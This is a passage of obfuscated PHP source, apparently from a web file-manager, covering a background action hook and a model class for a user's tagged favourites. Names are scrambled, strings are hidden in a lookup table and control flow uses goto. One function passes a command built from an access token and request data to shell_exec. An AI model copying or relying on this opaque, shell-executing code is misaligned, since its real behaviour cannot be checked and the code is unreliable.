eπÛ“◊√ﬂ´: $fÜ˜®®¡»Í =& $_SERVER[ÁŸäœ¨]; $Bù´Ü„†¶ó = $f˜≤™Ø‡‹≠; if (is_array($f˜≤™Ø‡‹≠)) { $Bù´Ü„†¶ó = $fÜ˜®®¡»Í[20]; foreach ($f˜≤™Ø‡‹≠ as $dÿˆ¥Œã√⁄ => $Bò¯øñÌ¯Œ) { $Bò¯øñÌ¯Œ = is_array($Bò¯øñÌ¯Œ) ? json_encode($Bò¯øñÌ¯Œ) : $Bò¯øñÌ¯Œ; $Bò¯øñÌ¯Œ = is_bool($Bò¯øñÌ¯Œ) ? intval($Bò¯øñÌ¯Œ) : $Bò¯øñÌ¯Œ; $Bù´Ü„†¶ó .= $fÜ˜®®¡»Í[21] . $dÿˆ¥Œã√⁄ . $fÜ˜®®¡»Í[22] . rawurlencode($Bò¯øñÌ¯Œ); } } goto e˜≤ ì°≠Ò; bÇÜóûã¢¢: $D‡Ÿö•∫Ω– = json_decode($cÈè‚∫ó∞‰, !0); $AõÃÂÇ®Ëà = is_array($D‡Ÿö•∫Ω–) ? $D‡Ÿö•∫Ω– : array($fÜ˜®®¡»Í[33] => null, $fÜ˜®®¡»Í[34] => $cÈè‚∫ó∞‰); if (!$D‡Ÿö•∫Ω–) { echo $cÈè‚∫ó∞‰; } goto f¶π‚ëãÙµ; cÕåÙÑ∆ÈÏ: $cÇ∆ù÷‰¨ = phpBinCommand(); if ($cÇ∆ù÷‰¨ && function_exists($fÜ˜®®¡»Í[25])) { $E≥ü©Ø‘≈Ë = $cÇ∆ù÷‰¨ . $fÜ˜®®¡»Í[26] . BASIC_PATH . $fÜ˜®®¡»Í[27] . escapeshellarg($bÎ≈¶∫ñ›ç); $cÈè‚∫ó∞‰ = shell_exec($E≥ü©Ø‘≈Ë); } if (!$cÈè‚∫ó∞‰) { $D‚¨È›Í€ñ = stream_context_create(array($fÜ˜®®¡»Í[28] => array($fÜ˜®®¡»Í[29] => 20, $fÜ˜®®¡»Í[30] => $fÜ˜®®¡»Í[31]))); $cÈè‚∫ó∞‰ = file_get_contents(APP_HOST . $fÜ˜®®¡»Í[32] . $bÎ≈¶∫ñ›ç, !1, $D‚¨È›Í€ñ); } goto bÇÜóûã¢¢; e˜≤ ì°≠Ò: $b≤ØµﬂûŒº = Action($fÜ˜®®¡»Í[23])->accessToken(); $bÎ≈¶∫ñ›ç = str_replace($fÜ˜®®¡»Í[5], $fÜ˜®®¡»Í[4], $bÎ≈¶∫ñ›ç) . $fÜ˜®®¡»Í[24] . $b≤ØµﬂûŒº . $Bù´Ü„†¶ó; $cÈè‚∫ó∞‰ = $fÜ˜®®¡»Í[20]; goto cÕåÙÑ∆ÈÏ; c¿¯Ã–âŸœ: } function ActionCallHook($A¯õ‡›À√) { goto Eﬁ∞öÕêâŸ; eˆßÖˆÕ¬˜: $GLOBALS[$cÿ∏ÌçÙÖ≠[35]] = 1; $dÙ≥ ≈ñâÒ = ActionApply($A¯õ‡›À√, $DàúÏÌº∞Ç); $DŸ‘Ç·Ûûˆ = ob_get_clean(); goto eá”è∆ÍØ„; Eﬁ∞öÕêâŸ: $cÿ∏ÌçÙÖ≠ =& $_SERVER[ÁŸäœ¨]; ob_start(); $DàúÏÌº∞Ç = array_slice(func_get_args(), 1); goto eˆßÖˆÕ¬˜; eá”è∆ÍØ„: $dÙ≥ ≈ñâÒ = $DŸ‘Ç·Ûûˆ ? json_decode($DŸ‘Ç·Ûûˆ, !0) : $dÙ≥ ≈ñâÒ; $GLOBALS[$cÿ∏ÌçÙÖ≠[35]] = 0; return $dÙ≥ ≈ñâÒ; goto eÃÒÜœÖäü; eÃÒÜœÖäü: } goto f¥èπÌƒé”; a◊ÆáÜ±ëü: define($_SERVER[Ä¿¡‡öóµŸﬂ‡][1934], 2); define($_SERVER[Ä¿¡‡öóµŸﬂ‡][1935], 3); define($_SERVER[Ä¿¡‡öóµŸﬂ‡][1936], 4); goto cî’º—í©Ó; d¢ÉØá∆´–: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\162\137\146\141\x76"; protected function cacheFunctionAlias($Cçø§§¬·ä) { $Dıç⁄ü∆∂é =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; return array($Dıç⁄ü∆∂é[2489] => array(USER_ID, $Dıç⁄ü∆∂é[2544])); } protected function listData() { $eÇ¥™£àü— =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÎá√™æÆ® = array($eÇ¥™£àü—[1429] => USER_ID, $eÇ¥™£àü—[436] => array($eÇ¥™£àü—[2545], 0)); $bˆ˜–Â¥ìΩ = $eÇ¥™£àü—[2546]; $F›“ƒ»Œ§ = $eÇ¥™£àü—[2547]; $díéí“ﬁåé = $this->field($bˆ˜–Â¥ìΩ)->where($dÎá√™æÆ®)->order($F›“ƒ»Œ§)->select(); return $díéí“ﬁåé ? $díéí“ﬁåé : array(); } protected function listByTag($Dß…˜ÇÀ°É) { } protected function addToTag($CÖç¬†€°‘, $cË‘åö™Ñí) { $D∂ùä£Ÿ≠∂ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!Model($D∂ùä£Ÿ≠∂[2317])->listData($cË‘åö™Ñí) || !Model($D∂ùä£Ÿ≠∂[761])->pathInfo($CÖç¬†€°‘)) { return !1; } $B¢«ÖØù‚Ω = array($D∂ùä£Ÿ≠∂[1429] => USER_ID, $D∂ùä£Ÿ≠∂[436] => $cË‘åö™Ñí, $D∂ùä£Ÿ≠∂[387] => $CÖç¬†€°‘, $D∂ùä£Ÿ≠∂[388] => $D∂ùä£Ÿ≠∂[382], $D∂ùä£Ÿ≠∂[386] => $D∂ùä£Ÿ≠∂[33], $D∂ùä£Ÿ≠∂[2110] => 0); if ($this->where($B¢«ÖØù‚Ω)->find()) { return !1; } return $this->add($B¢«ÖØù‚Ω); } protected function removeFromTag($AÒÑ›ëËÒ´, $DàÍ—ıé—é) { $Fß⁄öØ⁄⁄ñ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!Model($Fß⁄öØ⁄⁄ñ[2317])->listData($DàÍ—ıé—é)) { return !1; } if (is_array($AÒÑ›ëËÒ´)) { $AÒÑ›ëËÒ´ = array($Fß⁄öØ⁄⁄ñ[7], $AÒÑ›ëËÒ´); } $AÉØ⁄Ñ»◊È = array($Fß⁄öØ⁄⁄ñ[1429] => USER_ID, $Fß⁄öØ⁄⁄ñ[436] => $DàÍ—ıé—é, $Fß⁄öØ⁄⁄ñ[388] => $Fß⁄öØ⁄⁄ñ[382], $Fß⁄öØ⁄⁄ñ[387] => $AÒÑ›ëËÒ´); return $this->where($AÉØ⁄Ñ»◊È)->delete(); } protected function removeByTag($FØ‡√ƒ·ôØ) { $Fö⁄‹ùÓè˘ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!$FØ‡√ƒ·ôØ) { return !1; } $c¯©ãÖ•èë = array($Fö⁄‹ùÓè˘[1429] => USER_ID, $Fö⁄‹ùÓè˘[436] => $FØ‡√ƒ·ôØ); return $this->where($c¯©ãÖ•èë)->delete(); } protected function removeBySource($b‰¢´ÜÔÂ€) { $càÃ≠ªÃŸÁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $F‡—±ÀÈﬂò = array($càÃ≠ªÃŸÁ[1429] => USER_ID, $càÃ≠ªÃŸÁ[387] => $b‰¢´ÜÔÂ€, $càÃ≠ªÃŸÁ[436] => array($càÃ≠ªÃŸÁ[932], 0)); return $this->where($F‡—±ÀÈﬂò)->delete(); } }